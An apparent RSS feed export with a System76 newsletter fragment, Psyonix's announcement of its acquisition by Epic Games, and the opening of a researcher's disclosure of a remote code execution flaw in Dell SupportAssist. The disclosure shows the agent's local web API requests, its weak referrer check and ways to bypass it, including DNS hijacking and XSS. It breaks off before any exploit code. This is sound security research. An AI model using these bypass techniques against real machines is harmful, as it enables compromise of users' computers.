&lt;p&gt;&lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3D55e7a247da%26e%3Dca9b4ae634&amp;amp;t=ZDAwMWNjYTgzZGQyOTJiMzM4YjE4YzZiYzRiYWYzMzdkMTMyNjJiYyxVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Team TASBot&lt;/a&gt; is headed to Utah for their annual Desert Tesla Charity Drive, which will be streamed on the Oryx Pro! This &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3De2cccb912b%26e%3Dca9b4ae634&amp;amp;t=Mjc1NGEzYzJkYzk5YzNlMzBmZDU2YjJjNzg4OWEwOWFiNDlhMmQ2NixVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Twitch&lt;/a&gt; stream features dwangoAC and TheAxeMan as they become wildly uncomfortable in their respective Teslas, as donations determine the methods of discomfort. Viewers are encouraged to use Crowd Control to alter a car’s features, such as the max speed, car horn, music, and internal temperature, and even make the car dance.&lt;/p&gt;
&lt;p&gt;Funds raised during the stream go towards supporting the &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3D0661393606%26e%3Dca9b4ae634&amp;amp;t=NjY3ZTQ5NDgwYWQ5M2RiMTE1MDcwMTkxOTRkNmRmOWMzNDU2YjJmNixVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;National Alliance on Mental Illness&lt;/a&gt;, an organization that advocates for educational programs and public policy and offers a free hotline for providing support and information.&lt;/p&gt;
&lt;blockquote readability=&quot;7.7647058823529&quot;&gt;
&lt;p&gt;If there’s anything else you want to hear about in these newsletters in the future, be it tech or office dogs or anything in between, just shoot an email over to &lt;a href=&quot;https://t.umblr.com/redirect?z=mailto%3Akatie%40system76.com%3Fsubject%3DNewsletter%2520Ideas%21%26body%3DI%2520want%2520to%2520suggest%2520a%2520few%2520things%21&amp;amp;t=MmRiZTJmMDQxZDg1ZTBiNTU1MTk0YWE4MjFmODIxYjBkNWE0NjE0YixVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Katie&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Wed, 01 May 2019 20:04:09 +0000</pubDate>
<dc:creator>jseliger</dc:creator>
<og:title>System76 News: Platinum Luxury Bonus April Edition</og:title>
<og:description>Subscribe to our monthly newsletter to get the latest monthly scoops straight to your inbox! As the 4th month of the year comes to a close, we celebrate the 4th release of Pop!_OS, which had...</og:description>
<og:url>https://blog.system76.com/post/184439321333/system76-news-platinum-luxury-bonus-april-edition</og:url>
<og:type>article</og:type>
<og:image>https://66.media.tumblr.com/441d4b97757c36e57e613ea368f2cd22/tumblr_inline_pqj3s5HbOO1wbr829_640.png</og:image>
<dc:format>text/html</dc:format>
<dc:identifier>https://blog.system76.com/post/184439321333/system76-news-platinum-luxury-bonus-april-edition</dc:identifier>
</item>
<item>
<title>Epic Games Is Acquiring Psyonix</title>
<link>https://www.rocketleague.com/news/psyonix-is-joining-the-epic-family-/</link>
<guid isPermaLink="true" >https://www.rocketleague.com/news/psyonix-is-joining-the-epic-family-/</guid>
<description>&lt;img width=&quot;1920px&quot; src=&quot;https://rocketleague.media.zestyio.com/in_article_image.309bf22bd29c2e411e9dd8eb07575bb1.jpg&quot; class=&quot;attachment-large-billboard size-large-billboard post-image&quot; alt=&quot;Psyonix is Joining the Epic Family! Image&quot;/&gt;&lt;p&gt;Today is a big day for us here at Psyonix because, just as the headline says, we’re officially joining the Epic Games family.&lt;/p&gt;&lt;p&gt;Your first question to news like this might be, &quot;What does this mean for Rocket League and its community?&quot; We’re happy to say that the answers are only positive. Rocket League always has been and always will be a community-driven game, and now that we have joined forces with Epic, we will be able to serve our community in even bigger and better ways!&lt;/p&gt;
&lt;p&gt;We understand that you might have additional questions about this new relationship, which is why we’ve assembled this quick FAQ to answer some of your initial Qs:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&quot;No, really. What does this mean for Rocket League?&quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In the short term, nothing will change at all! We’re still committed to providing Rocket League with frequent updates that have new features, new content, and new ways to play the game for as long as you’ll have us.&lt;/p&gt;
&lt;p&gt;In the long-term, we expect to bring Rocket League to the Epic Games store and to leverage our new relationship to grow the game in ways we couldn’t do on our own before. We believe that bringing Rocket League to new audiences with more support is a win for everybody.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&quot;Does this mean the gameplay will be different?&quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Nope!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&quot;What does this mean for the Rocket League Esports ecosystem?&quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We think this is a great move for the Rocket League Esports ecosystem because it significantly increases our potential reach and resources, just like it does for the game itself. We really do believe that you'll find our future in esports to be very exciting -- especially in the near future, where on June 21-23 at the Prudential Center in Newark, New Jersey, the Rocket League Championship Series (RLCS) finals will end our 7th season with a bang!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&quot;What happens to the Psyonix team?&quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are the same team that we’ve always been, only now, we have the power and experience of Epic Games behind us!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;One last thing before we go…&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The success of Rocket League would not have been possible without you, our community. Your loyalty, excitement, and creativity in supporting Psyonix has helped us become who we are, and we look forward to you helping us for many more years to come. You have our sincerest thanks and appreciation.&lt;/p&gt;

&lt;p&gt;Respectfully,&lt;/p&gt;
&lt;p&gt;The Psyonix Team&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Editor’s Note: We wanted to clarify something for you after today’s news: Rocket League is and remains available on Steam. Anyone who owns Rocket League through Steam can still play it and can look forward to continued support. Thanks!&lt;/strong&gt;&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;br/&gt;NOTE: This transaction remains subject to customary closing conditions. Epic and Psyonix currently expect to close the acquisition near the end of May to early June 2019.&lt;/em&gt;&lt;/p&gt;


</description>
<pubDate>Wed, 01 May 2019 19:59:31 +0000</pubDate>
<dc:creator>yobananaboy</dc:creator>
<og:type>website</og:type>
<og:title>Psyonix is Joining the Epic Family!</og:title>
<og:description></og:description>
<og:url>https://www.rocketleague.com/news/psyonix-is-joining-the-epic-family-/</og:url>
<og:image>https://rocketleague.media.zestyio.com/in_article_image.d4899f96e1858d7c1e61787a9f72ea96.jpg</og:image>
<dc:language>en-us</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.rocketleague.com/news/psyonix-is-joining-the-epic-family-/</dc:identifier>
</item>
<item>
<title>Remote Code Execution on Most Dell Computers</title>
<link>https://d4stiny.github.io/Remote-Code-Execution-on-most-Dell-computers/</link>
<guid isPermaLink="true" >https://d4stiny.github.io/Remote-Code-Execution-on-most-Dell-computers/</guid>
<description>&lt;p&gt;What computer do you use? Who made it? Have you ever thought about what came with your computer? When we think of Remote Code Execution (RCE) vulnerabilities in mass, we might think of vulnerabilities in the operating system, but another attack vector to consider is “What third-party software came with my PC?”. In this article, I’ll be looking at a Remote Code Execution vulnerability I found in &lt;a href=&quot;https://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist&quot;&gt;Dell SupportAssist&lt;/a&gt;, software meant to “proactively check the health of your system’s hardware and software” and which is “preinstalled on most of all new Dell devices”.&lt;/p&gt;

&lt;p&gt;Back in September, I was in the market for a new laptop because my 7-year-old Macbook Pro just wasn’t cutting it anymore. I was looking for an affordable laptop that had the performance I needed and I decided on Dell’s G3 15 laptop. I decided to upgrade my laptop’s 1 terabyte hard drive to an SSD. After upgrading and re-installing Windows, I had to install drivers. This is when things got interesting. After visiting Dell’s support site, I was prompted with an interesting option.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Bc8Cx6H.png&quot; alt=&quot;Support Page&quot;/&gt;&lt;/p&gt;
&lt;p&gt;“Detect PC”? How would it be able to detect my PC? Out of curiosity, I clicked on it to see what happened.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/USoJume.png&quot; alt=&quot;SupportAssist Download Prompt&quot;/&gt;&lt;/p&gt;
&lt;p&gt;A program which automatically installs drivers for me. Although it was a convenient feature, it seemed risky. The agent wasn’t installed on my computer because it was a fresh Windows installation, but I decided to install it to investigate further. It was very suspicious that Dell claimed to be able to update my drivers through a website.&lt;/p&gt;
&lt;p&gt;Installing it was a painless process with just a click to install button. In the shadows, the SupportAssist Installer created the &lt;code class=&quot;highlighter-rouge&quot;&gt;SupportAssistAgent&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;Dell Hardware Support&lt;/code&gt; service. These services corresponded to .NET binaries making it easy to reverse engineer what it did. After installing, I went back to the Dell website and decided to check what it could find.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/3koDq6L.png&quot; alt=&quot;Download Drivers&quot;/&gt;&lt;/p&gt;
&lt;p&gt;I opened the Chrome Web Inspector and the Network tab then pressed the “Detect Drivers” button.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/bEVfaii.png&quot; alt=&quot;Network Tab&quot;/&gt;&lt;/p&gt;
&lt;p&gt;The website made requests to port &lt;code class=&quot;highlighter-rouge&quot;&gt;8884&lt;/code&gt; on my local computer. Checking that port out on Process Hacker showed that the &lt;code class=&quot;highlighter-rouge&quot;&gt;SupportAssistAgent&lt;/code&gt; service had a web server on that port. What Dell was doing is exposing a REST API of sorts in their service which would allow communication from the Dell website to do various requests. The web server replied with a strict &lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt; header of &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.dell.com&lt;/code&gt; to prevent other websites from making requests.&lt;/p&gt;
&lt;p&gt;On the web browser side, the client was providing a signature to authenticate various commands. These signatures are generated by making a request to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken&lt;/code&gt; which also provides when the signature expires. After pressing download drivers on the web side, this request was of particular interest:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;9&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;13&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;POST http://127.0.0.1:8884/downloadservice/downloadmanualinstall?expires=expiretime&amp;amp;signature=signature
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Origin: https://www.dell.com
Referer: https://www.dell.com/support/home/us/en/19/product-support/servicetag/xxxxx/drivers?showresult=true&amp;amp;files=1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The body:&lt;/p&gt;
&lt;div class=&quot;language-json highlighter-rouge&quot; readability=&quot;16.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;28&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Dell G3 3579 and 3779 System BIOS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;category&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;BIOS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;G3_3579_1.9.0.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;location&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://downloads.dell.com/FOLDER05519523M/1/G3_3579_1.9.0.exe?uid=29b17007-bead-4ab2-859e-29b6f1327ea1&amp;amp;fn=G3_3579_1.9.0.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;isSecure&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fileUniqueId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;acd94f47-7614-44de-baca-9ab6af08cf66&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;run&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;restricted&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fileId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;198393521&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fileSize&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;13 MB&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;checkedStatus&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fileStatus&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;-99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;driverId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;4WW45&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dupInstallReturnCode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cssClass&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;inactive-step&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;isReboot&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DiableInstallNow&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;$$hashKey&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;object:175&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;It seemed like the web client could make direct requests to the &lt;code class=&quot;highlighter-rouge&quot;&gt;SupportAssistAgent&lt;/code&gt; service to “download and manually install” a program. I decided to find the web server in the &lt;code class=&quot;highlighter-rouge&quot;&gt;SupportAssistAgent&lt;/code&gt; service to investigate what commands could be issued.&lt;/p&gt;
&lt;p&gt;On start, Dell SupportAssist starts a web server (System.Net.HttpListener) on either port 8884, 8883, 8886, or port 8885. The port depends on whichever one is available, starting with 8884. On a request, the ListenerCallback located in HttpListenerServiceFacade calls ClientServiceHandler.ProcessRequest.&lt;/p&gt;
&lt;p&gt;ClientServiceHandler.ProcessRequest, the base web server function, starts by doing integrity checks for example making sure the request came from the local machine and various other checks. Later in this article, we’ll get into some of the issues in the integrity checks, but for now most are not important to achieve RCE.&lt;/p&gt;
&lt;p&gt;An important integrity check for us is in ClientServiceHandler.ProcessRequest, specifically the point at which the server checks to make sure my referrer is from Dell. ProcessRequest calls the following function to ensure that I am from Dell:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;8&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;// Token: 0x060000A8 RID: 168 RVA: 0x00004EA0 File Offset: 0x000030A0
public static bool ValidateDomain(Uri request, Uri urlReferrer)
{
        return SecurityHelper.ValidateDomain(urlReferrer.Host.ToLower()) &amp;amp;&amp;amp; (request.Host.ToLower().StartsWith(&quot;127.0.0.1&quot;) || request.Host.ToLower().StartsWith(&quot;localhost&quot;)) &amp;amp;&amp;amp;request.Scheme.ToLower().StartsWith(&quot;http&quot;) &amp;amp;&amp;amp; urlReferrer.Scheme.ToLower().StartsWith(&quot;http&quot;);
}

// Token: 0x060000A9 RID: 169 RVA: 0x00004F24 File Offset: 0x00003124
public static bool ValidateDomain(string domain)
{
        return domain.EndsWith(&quot;.dell.com&quot;) || domain.EndsWith(&quot;.dell.ca&quot;) || domain.EndsWith(&quot;.dell.com.mx&quot;) || domain.EndsWith(&quot;.dell.com.br&quot;) || domain.EndsWith(&quot;.dell.com.pr&quot;) || domain.EndsWith(&quot;.dell.com.ar&quot;) || domain.EndsWith(&quot;.supportassist.com&quot;);
}
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The issue with the function above is the fact that it really isn’t a solid check and gives an attacker a lot to work with. To bypass the Referer/Origin check, we have a few options:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Find a Cross Site Scripting vulnerability in any of Dell’s websites (I should only have to find one on the sites designated for SupportAssist)&lt;/li&gt;
&lt;li&gt;Find a Subdomain Takeover vulnerability&lt;/li&gt;
&lt;li&gt;Make the request from a local program&lt;/li&gt;
&lt;li&gt;Generate a random subdomain name and use an external machine to DNS Hijack the victim. Then, when the victim requests [random].dell.com, we respond with our server.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;In the end, I decided to go with option 4, and I’ll explain why in a later bit. After verifying the Referer/Origin of the request, ProcessRequest sends the request to corresponding functions for GET, POST, and OPTIONS.&lt;/p&gt;
&lt;p&gt;When I was learning more about how Dell SupportAssist works, I intercepted different types of requests from Dell’s support site. Luckily, my laptop had some pending updates, and I was able to intercept requests through my browsers console.&lt;/p&gt;
&lt;p&gt;At first, the website tries to detect SupportAssist by looping through the aformentioned service ports and connecting to the Service Method “isalive”. What was interesting was that it was passing a “Signature” parameter and a “Expires” parameter. To find out more, I reversed the javascript side of the browser. Here’s what I found out:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;First, the browser makes a request to https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken and gets the latest “Token”, or the signatures I was talking about earlier. The endpoint also provides the “Expires token”. This solves the signature problem.&lt;/li&gt;
&lt;li&gt;Next, the browser makes a request to each service port with a style like this: http://127.0.0.1:[SERVICEPORT]/clientservice/isalive/?expires=[EXPIRES]&amp;amp;signature=[SIGNATURE].&lt;/li&gt;
&lt;li&gt;The SupportAssist client then responds when the right service port is reached, with a style like this:
&lt;div class=&quot;language-json highlighter-rouge&quot; readability=&quot;11&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;17&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;isAlive&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;clientVersion&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[CLIENT VERSION]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;requiredVersion&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;success&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;localTime&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;EPOCH&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;TIME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Exception&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Code&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Message&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;Once the browser sees this, it continues with further requests using the now determined service port.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Some concerning factors I noticed while looking at different types of requests I could make is that I could get a very detailed description of every piece of hardware connected to my computer using the “getsysteminfo” route. Even through Cross Site Scripting, I was able to access this data, which is an issue because I could seriously fingerprint a system and find some sensitive information.&lt;/p&gt;
&lt;p&gt;Here are the methods the agent exposes:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;clientservice_getdevicedrivers - Grabs available updates.
diagnosticsservice_executetip - Takes a tip guid and provides it to the PC Doctor service (Dell Hardware Support).
downloadservice_downloadfiles - Downloads a JSON array of files.
clientservice_isalive - Used as a heartbeat and returns basic information about the agent.
clientservice_getservicetag - Grabs the service tag.
